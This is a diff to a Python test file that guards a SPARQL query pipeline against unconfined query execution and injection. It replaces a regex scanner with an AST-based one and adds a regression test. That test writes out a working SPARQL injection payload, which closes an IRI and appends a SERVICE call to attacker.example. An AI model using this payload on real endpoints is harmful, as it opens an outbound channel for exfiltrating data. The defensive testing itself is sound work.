@@ -543,43 +543,81 @@ BUILT_HERE_QUERY_VARS = {
     # `FROM <data_graph>`, with the description sanitised into a FILTER literal.
     # A literal inside the WHERE cannot introduce a dataset clause: the grammar
     # puts DatasetClause* before the WhereClause.
-    "q": "f-string template carrying its own FROM <data_graph>",
+    "anchor_query": "f-string template carrying its own FROM <data_graph>",
     # `_fetch_ontology` / `_instance_graph_ontology_fallback`: templates over
     # `FROM <instance_graph>` / `FROM <target_graph>`.
     "type_query": "f-string template carrying its own FROM",
     "pred_query": "f-string template carrying its own FROM",
     # `_scan_instance_types` (ONTA-427): template over `FROM <instance_graph>`.
     "type_scan_query": "f-string template carrying its own FROM <instance_graph>",
-    # `_resolve_uri_labels`: template, scoped by ONTA-424 to `FROM <data_graph>`
-    # when the caller threads one.
-    "label_query": "f-string template, scoped to FROM <data_graph> (ONTA-424)",
+    # `_fetch_ontology`'s enum probes: templates over `FROM <instance_graph>`.
+    "count_query": "f-string template carrying its own FROM <instance_graph>",
+    "enum_values_query": "f-string template carrying its own FROM <instance_graph>",
+    # `_resolve_uri_labels`: template scoped to `FROM <data_graph>` (ONTA-424),
+    # whose interpolated IRIs are additionally filtered by
+    # `_is_interpolatable_iri` so a LITERAL that merely starts with the entity
+    # prefix cannot close the IRI and inject syntax (notably a SERVICE call).
+    "label_query": "template: FROM <data_graph> + IRIREF-safe interpolation",
 }
 
 
-def _scan_execution_sites(lines: list[str]) -> tuple[list[str], list[str]]:
-    """``(confined, unconfined)`` store-call lines, deny-by-default.
+def _scan_execution_sites(source: str) -> tuple[list[str], list[str]]:
+    """``(confined, unconfined)`` store-call sites, deny-by-default.
 
-    A call is exempt only when its argument is a builder CALL (scoped by
-    construction, e.g. ``parent_map_query(graph_uri)``) or a bare variable
-    listed in :data:`BUILT_HERE_QUERY_VARS`. Everything else must be preceded by
-    a ``_confine_generated`` call.
+    Decided on the AST, not on a regex over the text. A regex needs the call to
+    fit on one line with a bare identifier inside the parentheses, and the four
+    shapes it cannot see are all ordinary Python that already exists in this
+    repo: a call wrapped across lines (which is what the formatter does at 88
+    columns), ``query(x, timeout=5)`` (the kwargs shape ``api/routes/grep.py``
+    already writes), ``query(x.strip())``, and an aliased receiver. A guard a
+    code formatter can defeat is not deny-by-default.
+
+    A call is exempt only when its first positional argument is a call to a
+    ``*_query`` BUILDER (scoped by construction, e.g.
+    ``parent_map_query(graph_uri)``) or a bare ``Name`` listed in
+    :data:`BUILT_HERE_QUERY_VARS`. Everything else — any other expression, and
+    any name without a written-down justification — must have a
+    ``_confine_generated`` call in the eight lines above it. "Any call is fine"
+    would be too loose: ``query(generated.strip())`` is a call too.
     """
-    import re
+    import ast
 
-    call_re = re.compile(r"neptune\.query\(([^)]*)\)")
-    identifier_re = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
+    def _is_builder_call(node) -> bool:
+        if not isinstance(node, ast.Call):
+            return False
+        func = node.func
+        name = (
+            func.id
+            if isinstance(func, ast.Name)
+            else func.attr
+            if isinstance(func, ast.Attribute)
+            else ""
+        )
+        return name.endswith("_query")
+
+    tree = ast.parse(source)
+    lines = source.splitlines()
     confined: list[str] = []
     unconfined: list[str] = []
-    for i, line in enumerate(lines):
-        match = call_re.search(line)
-        if not match:
+    for node in ast.walk(tree):
+        if not isinstance(node, ast.Call):
             continue
-        argument = match.group(1).strip()
-        if not identifier_re.match(argument) or argument in BUILT_HERE_QUERY_VARS:
+        func = node.func
+        # Match on the METHOD name alone, so aliasing the client to a local
+        # (`client = self.neptune; client.query(...)`) cannot hide a site.
+        if not (isinstance(func, ast.Attribute) and func.attr == "query"):
             continue
+        if not node.args:
+            continue
+        argument = node.args[0]
+        if _is_builder_call(argument):
+            continue
+        if isinstance(argument, ast.Name) and argument.id in BUILT_HERE_QUERY_VARS:
+            continue
+        i = node.lineno - 1
         window = "\n".join(lines[max(0, i - 8) : i])
         (confined if "_confine_generated(" in window else unconfined).append(
-            f"line {i + 1}: {line.strip()}"
+            f"line {node.lineno}: {lines[i].strip()}"
         )
     return confined, unconfined
 
@@ -599,9 +637,7 @@ def test_every_generated_sparql_execution_site_is_guarded():
 
     from cograph_client.nlp import pipeline as pipeline_mod
 
-    confined, unconfined = _scan_execution_sites(
-        inspect.getsource(pipeline_mod).splitlines()
-    )
+    confined, unconfined = _scan_execution_sites(inspect.getsource(pipeline_mod))
     assert not unconfined, (
         "unconfined SPARQL execution in nlp/pipeline.py:\n"
         + "\n".join(unconfined)
@@ -615,30 +651,54 @@ def test_every_generated_sparql_execution_site_is_guarded():
     )
 
 
-def test_the_structural_guard_catches_a_planted_violation():
+@pytest.mark.parametrize(
+    "planted",
+    [
+        # A brand-new variable name. The first draft of this guard matched two
+        # hard-coded names and was blind to anything else.
+        "generated = build_it()\nraw = await self.neptune.query(generated)",
+        # Wrapped across lines. This is what the formatter produces at 88
+        # columns, so it is the likeliest real-world miss, and a text regex
+        # anchored on one line cannot see it.
+        "generated = build_it()\nraw = await self.neptune.query(\n    generated\n)",
+        # Keyword arguments after the query. `api/routes/grep.py` already writes
+        # this shape, so it is not hypothetical.
+        "generated = build_it()\nraw = await self.neptune.query(generated, timeout=5)",
+        # An expression rather than a bare name: not a builder call we know, so
+        # deny by default.
+        "generated = build_it()\nraw = await self.neptune.query(generated.strip())",
+        # The receiver aliased to a local, hiding the word `neptune`.
+        "client = self.neptune\nraw = await client.query(generated)",
+    ],
+)
+def test_the_structural_guard_catches_a_planted_violation(planted):
     """The guard is only worth having if it fails on the thing it describes.
 
-    Both planted shapes matter: a brand-new variable name (which the earlier
-    name-matching draft was blind to), and a RENAME of an existing confined
-    site (which would otherwise silently drop out of the count).
+    Five shapes, four of which the earlier text-regex draft could not see. Each
+    is ordinary Python that already appears somewhere in this repo, so "nobody
+    would write that" is not an argument.
     """
-    planted = [
-        "        generated = build_something()",
-        "        raw = await self.neptune.query(generated)",
-    ]
     confined, unconfined = _scan_execution_sites(planted)
-    assert unconfined and not confined
+    assert unconfined and not confined, planted
 
-    renamed = [
-        "        sparql = self._confine_generated(sparql, data_graph)",
-        "        raw = await self.neptune.query(sparql)",
-    ]
+
+def test_the_structural_guard_does_not_cry_wolf():
+    """A confined site and a builder call must both stay quiet."""
+    renamed = (
+        "sparql = self._confine_generated(sparql, data_graph)\n"
+        "raw = await self.neptune.query(sparql)"
+    )
     confined, unconfined = _scan_execution_sites(renamed)
     assert confined and not unconfined
 
-    # A builder call stays exempt without needing an allowlist entry.
-    builder = ["        raw = await self.neptune.query(parent_map_query(g))"]
-    assert _scan_execution_sites(builder) == ([], [])
+    # A builder CALL is scoped by construction and needs no allowlist entry,
+    # in every argument shape.
+    for builder in (
+        "raw = await self.neptune.query(parent_map_query(g))",
+        "raw = await self.neptune.query(\n    parent_map_query(g),\n)",
+        "raw = await self.neptune.query(parent_map_query(g), timeout=5)",
+    ):
+        assert _scan_execution_sites(builder) == ([], []), builder
 
 
 @pytest.mark.asyncio
@@ -668,6 +728,91 @@ async def test_label_resolution_is_scoped_to_the_requests_own_graph():
 
     assert seen, "the label lookup never ran"
     assert _dataset_of(seen[0]) == [DATA_GRAPH]
+
+
+#: A value that merely STARTS with the entity prefix, then closes the IRI and
+#: appends its own graph pattern. Written out in full because the whole point is
+#: that it parses cleanly: a test asserting "some bad string is rejected" would
+#: pass against a payload that never worked.
+SERVICE_INJECTION_VALUE = (
+    "https://cograph.tech/entities/Film/x> } "
+    "SERVICE <http://attacker.example/sparql> "
+    "{ ?uri <http://www.w3.org/2000/01/rdf-schema#label> ?label } }#"
+)
+
+
+@pytest.mark.asyncio
+async def test_label_lookup_cannot_be_injected_by_a_literal_in_the_graph():
+    """A LITERAL is indistinguishable from an IRI by the time we see it.
+
+    ``parse_sparql_results`` flattens every binding to its ``.value`` string, so
+    a literal the workspace's own ingest put in the graph reaches the label
+    collector looking exactly like an entity IRI. Interpolating it into
+    ``<{u}>`` let it close the IRI and append a ``SERVICE`` call: an outbound
+    channel from inside the VPC, the same one rule C rejects on the raw route.
+    """
+    from cograph_client.nlp.pipeline import NLQueryPipeline, _is_interpolatable_iri
+
+    # The payload is only interesting if it really would have worked.
+    values_clause = f"<{SERVICE_INJECTION_VALUE}>"
+    injected = (
+        f"SELECT ?uri ?label FROM <{DATA_GRAPH}> WHERE {{ "
+        f"VALUES ?uri {{ {values_clause} }} "
+        f"?uri <http://www.w3.org/2000/01/rdf-schema#label> ?label . }}"
+    )
+    from rdflib.plugins.sparql.parser import parseQuery
+    from rdflib.plugins.sparql.parserutils import CompValue
+
+    names: set[str] = set()
+
+    def walk(node):
+        if isinstance(node, CompValue):
+            names.add(node.name)
+            for key in list(node.keys()):
+                walk(node[key])
+        elif isinstance(node, (list, tuple)):
+            for item in node:
+                walk(item)
+
+    for part in parseQuery(injected):
+        walk(part)
+    assert "ServiceGraphPattern" in names, "the payload no longer demonstrates the bug"
+
+    assert not _is_interpolatable_iri(SERVICE_INJECTION_VALUE)
+
+    seen: list[str] = []
+
+    async def query(sparql, *a, **k):
+        seen.append(sparql)
+        return {"head": {"vars": ["uri", "label"]}, "results": {"bindings": []}}
+
+    neptune = AsyncMock()
+    neptune.query = AsyncMock(side_effect=query)
+    p = NLQueryPipeline(neptune, "invented-anthropic-key")
+
+    out = await p._resolve_uri_labels([{"x": SERVICE_INJECTION_VALUE}], DATA_GRAPH)
+
+    # Nothing was sent at all (the only candidate was dropped), and if a future
+    # change does send something, it must carry no SERVICE and no injected text.
+    for sparql in seen:
+        assert "SERVICE" not in sparql.upper(), sparql
+        assert "attacker.example" not in sparql, sparql
+    # Dropping it costs the value a LABEL, not the row: `_format_answer`'s
+    # display step is `uri_labels.get(value, value)`, so an absent key renders
+    # the raw value exactly as it does for any other unlabelled string.
+    assert SERVICE_INJECTION_VALUE not in out
+
+
+def test_interpolatable_iri_uses_the_grammar_not_a_payload_blocklist():
+    from cograph_client.nlp.pipeline import _is_interpolatable_iri
+
+    assert _is_interpolatable_iri("https://cograph.tech/entities/Film/x")
+    assert not _is_interpolatable_iri("")
+    # Every codepoint SPARQL's IRIREF production excludes, one at a time.
+    for bad in '<>"{}|^`\\':
+        assert not _is_interpolatable_iri(f"https://cograph.tech/entities/a{bad}b"), bad
+    for bad in (" ", "\t", "\n", "\r", "\x00", "\x1f"):
+        assert not _is_interpolatable_iri(f"https://cograph.tech/entities/a{bad}b")
 
 
 @pytest.mark.asyncio
